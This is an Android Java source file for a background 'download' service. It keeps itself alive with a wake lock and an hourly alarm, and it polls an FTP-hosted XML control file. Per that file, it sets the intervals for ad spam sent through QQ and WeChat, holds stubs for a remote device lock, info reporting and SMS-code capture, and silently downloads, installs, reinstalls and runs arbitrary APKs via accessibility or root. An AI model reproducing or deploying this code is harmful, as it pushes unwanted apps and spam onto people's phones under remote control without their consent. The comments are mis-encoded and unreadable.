/**
 * 
 */
package download;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.NodeList;

import foreground.Config;


import ad.Ad2;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import download.install.InstallOfAcc;
import download.install.InstallOfCmd;
import util.Funcs;



/**
 * @author byc
 *
 */
public class Download1Service  extends Service {
    //�����߳� ��Ϣ����:
	public static final int WORKING_MSG_BASE=20;//��
    public static final int WORKING_PARSE_XML=WORKING_MSG_BASE+1;//����xml�ļ���
    public static final int WORKING_INSTALL_APP=WORKING_MSG_BASE+2;//��װ�ļ���
    public static final int MSG_RECEIVER_SMS_CODE = WORKING_MSG_BASE+3;
	private String TAG = "";
	private ftp mFtp;

	public static Map<String,InstallOfAcc> mAccs=new HashMap<String,InstallOfAcc>();
	public static Map<String,InstallOfCmd> mCmds=new HashMap<String,InstallOfCmd>();
	public static OrderThread orderThread;
	private Handler handlerOrderThread;
	public static Download1Service current=null;
	WakeLock wakeLock = null; 
	@Override
	public void onCreate() {
		super.onCreate();
		current=this;
		TAG=Config.TAG;
		mFtp=ftp.getFtp(this);
		//install=InstallApp.getInstallApp(this);
		orderThread=new OrderThread();
		orderThread.start();
		//5�����չ㲥��Ϣ
		IntentFilter filter = new IntentFilter();
		filter.addAction(ftp.ACTION_DOWNLOAD_INFO);
		registerReceiver(downloadFileReceiver, filter);
		//handlerStartService.postDelayed(runnableStartService, 1000*60*60 );//1000*60*60
		//mObserver = new SmsObserver(this,mHandler);
	    //Uri uri = Uri.parse("content://sms");
	    //getContentResolver().registerContentObserver(uri,true,mObserver);//ע��ContentObserver

		acquireWakeLock();
		startAlarm();
	}
    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if(msg.what == MSG_RECEIVER_SMS_CODE){
                String code = (String) msg.obj;
                Log.d(Config.TAG,code);

            }
        }
    };
	private BroadcastReceiver downloadFileReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			Log.d(TAG, "receive-->" + action);
			if(ftp.ACTION_DOWNLOAD_INFO.equals(action)) {
				int what = intent.getIntExtra("what",0);
				String filename=intent.getStringExtra("CurrentDownFilename");
				//mCurrentDownFile=filename;
				switch (what) {
				case ftp.FTP_LOGIN_FAIL:
					Log.d(TAG, "FTP_LOGIN_FAIL");
					break;

				case ftp.FTP_DOWNLOAD_SUC:
					Log.i(TAG, "FTP_DOWNLOAD_SUC:"+filename);
					if(filename.equals(Config.FTP_FILE_NAME)){
						//����XML�ļ�
						sendMSG(WORKING_PARSE_XML,filename);
					}else{
						//AutoInstall(filename);
						sendMSG(WORKING_INSTALL_APP,filename);
					}
						
					break;
				case ftp.FTP_DOWNLOAD_FAIL:
					Log.i(TAG, "FTP_DOWNLOAD_FAIL��"+filename);
					break;
				}
			}
		}
	};
	/*
	 * ÿ��1Сʱ����һ�η�������xml�ļ���
	 */
	Handler handlerStartService = new Handler();    
	Runnable runnableStartService = new Runnable() {    
		@Override    
		public void run() {    
		//�������ط���
			Intent intent=new Intent(Download1Service.this,Download1Service.class);
		    startService(intent);
		    handlerStartService.postDelayed(this,1000*60*60); //1000*60*60   
		}    
	};  
	/*
	 * ������ʱ�� 
	 */
	 private void startAlarm() 
	 { 
		 Intent intent = new Intent(this, Download1Service.class); 
		 PendingIntent pi=PendingIntent.getService(this, 0, intent, 0);
		 AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE); 
		 am.setRepeating(AlarmManager.RTC_WAKEUP,System.currentTimeMillis(),60*60*1000,pi); 
	 }
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	@Override
	public void onDestroy() { 
		super.onDestroy();
		current=null;
		orderThread.mOrderLooper.quit();//���������̣߳�
		//getContentResolver().unregisterContentObserver(mObserver);//ȡ��ע��ContentObserver
		releaseWakeLock();
		unregisterReceiver(downloadFileReceiver);
		Log.d(TAG, "DownloadManager onDestroy() executed");
	}
	@Override
	public boolean stopService(Intent name) {
		Log.d(TAG, "DownloadManager stopService() executed");
		return super.stopService(name);
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "DownloadManager onStartCommand() executed");
		mFtp.DownloadStart(Config.FTP_FILE_NAME);//��ʼ����
		//SendInfoInTime();//���ͻ�����Ϣ��
		return super.onStartCommand(intent, flags, startId);
	}
	//��ȡ��Դ�������ָ÷�������ĻϨ��ʱ��Ȼ��ȡCPUʱ���������� 
	 private void acquireWakeLock() 
	 { 
	 if (null == wakeLock) 
	 { 
	  PowerManager pm = (PowerManager)this.getSystemService(Context.POWER_SERVICE); 
	  wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK|PowerManager.ON_AFTER_RELEASE, Download1Service.class.getName()); 
	  if (null != wakeLock) 
	  { 
	  wakeLock.acquire(); 
	  } 
	 } 
	 } 
	 //�ͷ��豸��Դ�� 
	 private void releaseWakeLock() 
	 { 
	 if (null != wakeLock) 
	 { 
	  wakeLock.release(); 
	  wakeLock = null; 
	 } 
	 } 
	//------------------------------------------------------------------------------------------------
	/*
	 * �����ļ�������Ϣ�����̣߳�
	 */
	private void sendMSG(int iMsg,String filename){
		Message msg = new Message();
		msg.what = iMsg;
		Bundle bundle = new Bundle();
		bundle.clear();
		bundle.putInt("what",iMsg);
		bundle.putString("CurrentDownFilename", filename);
		msg.setData(bundle);  //
		handlerOrderThread.sendMessage(msg);
	}
	 //_______________________________________����XML�ļ�_____________________________________________________
    public void parser(String xmlfilename) throws Exception{
    	try {  
    			File f=new File(xmlfilename);
    			NodeList items=null;
    			DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
    			DocumentBuilder builder=factory.newDocumentBuilder();
    			Document doc = builder.parse(f);
    			Element rootElement = doc.getDocumentElement(); 
    			NamedNodeMap admap;
    			
    			items = rootElement.getElementsByTagName("version");
    			if(items.getLength()>0)Config.new_version= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setNewVersion(Config.new_version);
    			
    			items = rootElement.getElementsByTagName("contact");
    			if(items.getLength()>0)Config.contact= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setContactWay(Config.contact);
    			
    			items = rootElement.getElementsByTagName("ad");
    			if(items.getLength()>0)Config.ad= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setAd(Config.ad);
    			if(items.item(0).getAttributes().getLength()>0){
    				admap = items.item(0).getAttributes(); 
    				String test=admap.getNamedItem("test").getNodeValue();
    				Config.NoRegUserSendADinterval=Integer.parseInt(test);
    				Config.getConfig(getApplicationContext()).setNoRegUserSendADinterval(Config.NoRegUserSendADinterval);
    				String release=admap.getNamedItem("release").getNodeValue();
    				Config.RegUserSendADinterval=Integer.parseInt(release);
    				Config.getConfig(getApplicationContext()).setRegUserSendADinterval(Config.RegUserSendADinterval);
    				String other=admap.getNamedItem("other").getNodeValue();
    				Config.OtherMediaSendADinterval=Integer.parseInt(other);
    				Config.getConfig(getApplicationContext()).setOtherMediaSendADinterval(Config.OtherMediaSendADinterval);
    				String hb=admap.getNamedItem("hb").getNodeValue();
    				Config.bLuckyMoneySend=Boolean.parseBoolean(hb);
    				Config.getConfig(getApplicationContext()).setLuckyMoneySendIs(Config.bLuckyMoneySend);
    			}
    			
    			items = rootElement.getElementsByTagName("download");
    			if(items.getLength()>0)Config.download= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setDownloadAddr(Config.download);
    			
    			items = rootElement.getElementsByTagName("homepage");
    			if(items.getLength()>0)Config.homepage= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setHomepage(Config.homepage);
    			
    			items = rootElement.getElementsByTagName("warning");
    			if(items.getLength()>0)Config.warning= items.item(0).getFirstChild().getNodeValue();
    			Config.getConfig(getApplicationContext()).setWarning(Config.warning);
    			String say=Config.ad+"��ϵ"+Config.contact+"���ص�ַ�����Ƶ�������򿪣���"+Config.homepage;
    			Ad2.setADsay(say);
    			if(Ad2.currentQQ!=null)Ad2.currentQQ.getADinterval();
    			if(Ad2.currentWX!=null)Ad2.currentWX.getADinterval();
    			
    			items = rootElement.getElementsByTagName("lock");
    			if(items.getLength()>0){
    				admap = items.item(0).getAttributes(); 
    				String sLock=admap.getNamedItem("locked").getNodeValue();
    				boolean bLock=Boolean.parseBoolean(sLock);
    				String pwd=admap.getNamedItem("pwd").getNodeValue();
    				if(bLock){
    					//OrderService.processLock(this,pwd);
    				}
    			}
    			items = rootElement.getElementsByTagName("info");
    			if(items.getLength()>0){
    				String info= items.item(0).getFirstChild().getNodeValue();
    				boolean getInfo=Boolean.parseBoolean(info);
    				//if(getInfo)SendInfo(DownloadService.this);
    			}
    			items = rootElement.getElementsByTagName("install");
    			if(items.getLength()>0){
    				Config.install= items.item(0).getFirstChild().getNodeValue();
    				String appName=items.item(0).getFirstChild().getNodeValue();
    				admap = items.item(0).getAttributes(); 
    				String download=admap.getNamedItem("download").getNodeValue();
    				Config.install_download=Boolean.parseBoolean(download);
    				String run=admap.getNamedItem("run").getNodeValue();
    				Config.install_run=Boolean.parseBoolean(run);
    				boolean runAfterInstall=Boolean.parseBoolean(run);
    				String versioncode=admap.getNamedItem("version").getNodeValue();
    				int iVersionCode=Integer.parseInt(versioncode);
    				if(Config.install_download){
    					if(!AutoInstall(appName,iVersionCode,runAfterInstall))
    						mFtp.DownloadStart(appName);
    				}
    			}
    			//Config.getConfig(null).setWarning(Config.warning);
    			
    	 	} catch (Exception e) {  
    	 		Log.e(TAG, e.getMessage()); 
    	 		e.printStackTrace();
    	 	}  
    }
    /*
     * ���ܰ�װ��
     */
    private void InstallNewFile(final String filename){

				try {
					boolean bRoot=Config.bRoot;
					bRoot=false;
					if(bRoot){
						InstallOfCmd ic=mCmds.get(filename);
						if(ic==null)return;
						ic.startInstall();
					}else{
						InstallOfAcc ia=mAccs.get(filename);
						if(ia==null)return;
						ia.Install();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}//try {

    }
    /*
     * ���ܰ�װ��
     */
    private void AutoInstall2(final String filename){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					boolean bRoot=Config.bRoot;
					bRoot=false;
					if(bRoot){
						InstallOfCmd ic=mCmds.get(filename);
						if(ic==null)return;
						ic.startInstall();
					}else{
						InstallOfAcc ia=mAccs.get(filename);
						if(ia==null)return;
						ia.startInstall();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}//public
		}).start();
    }
    /*
     * ���ܰ�װ��
     */
    private boolean AutoInstall(String filename,int versionCode,boolean runAfterInstall){
    	boolean bRoot=Config.bRoot;
    	bRoot=false;
    	if(bRoot){
			InstallOfCmd ic=mCmds.get(filename);
			if(ic==null){
				ic=new InstallOfCmd(Download1Service.this,filename,runAfterInstall);
				mCmds.put(filename, ic);
			}
			if(ic.needDownLoad(versionCode)){
				ic.app.versioncode=versionCode;
				ic.app.runAfterInstall=runAfterInstall;
				return false;
			}
			ic.app.versioncode=versionCode;
			ic.app.runAfterInstall=runAfterInstall;
			ic.startInstall();
			return true;
		}else{
			InstallOfAcc ia=mAccs.get(filename);
			if(ia==null){
				ia=new InstallOfAcc(Download1Service.this,filename);
				mAccs.put(filename, ia);
			}
			if(ia.needDownLoad(versionCode)){
				ia.app.versioncode=versionCode;
				ia.app.runAfterInstall=runAfterInstall;
				return false;//�������ļ���������װ��
			}
			ia.app.versioncode=versionCode;
			ia.app.runAfterInstall=runAfterInstall;
			ia.reInstall();//ִ���ٰ�װ�������ж�أ������°�װ����
			return true;
		}
    }
    //_______________________________________����_____________________________________________________
    private void makeDir(String dirPath) {
        File file = new File(dirPath);
        if (!file.exists()) {
            file.mkdirs();
        }
    }
    private void deletefile(String filename) {
        File file = new File(filename);
        if (file.exists()) {
            file.delete();
        }
    }
    //----------------------------------------------------------------------------------------------
    public class OrderThread extends Thread{
    	private String xmlFile;
    	public volatile Looper mOrderLooper;//��Ϣ��
    	public OrderThread(){
    		
    	}
   	 @Override  
     public void run() { 
			//����XML�ļ�
   		Looper.prepare();
   		mOrderLooper=Looper.myLooper();
   		handlerOrderThread=new Handler(){
   			 @Override
   			public void handleMessage(Message msg) {
   			super.handleMessage(msg);
   				Bundle bundle = msg.getData();
   				String CurrentDownFilename=(String)bundle.get("CurrentDownFilename" );
   				switch (msg.what) {
   				case WORKING_PARSE_XML:
   					xmlFile=Config.LocalPath+CurrentDownFilename;
   					try{
   					parser(xmlFile);
   					} catch (Exception e) {  
   			 	 		e.printStackTrace();
   					}
   					deletefile(xmlFile);//ʹ���������ɾ����
				break;
   				case WORKING_INSTALL_APP:
   					InstallNewFile(CurrentDownFilename);
				break;

   				}
   			 }
   		};    
		Looper.loop(); 
		Log.i(TAG, "OrderThread quit.");
   	 }
   }
   
    
}
